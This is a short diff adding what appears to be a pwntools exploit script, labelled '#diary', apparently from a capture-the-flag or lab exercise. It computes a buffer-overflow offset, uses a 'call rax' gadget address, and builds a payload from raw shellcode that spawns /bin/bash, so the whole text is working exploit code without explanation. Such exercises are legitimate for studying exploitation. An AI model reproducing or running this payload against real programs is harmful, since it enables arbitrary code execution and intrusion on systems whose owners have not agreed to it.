@@ -1,0 +1,6 @@
+#diary
+offset = find_ip(cyclic(300))
+call_rax = 0x401014
+shellcode = asm(shellcraft.amd64.linux.sh())
+shellcode = b'\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x00'
+payload = shellcode + cyclic(offset-len(shellcode)) + pack(call_rax)
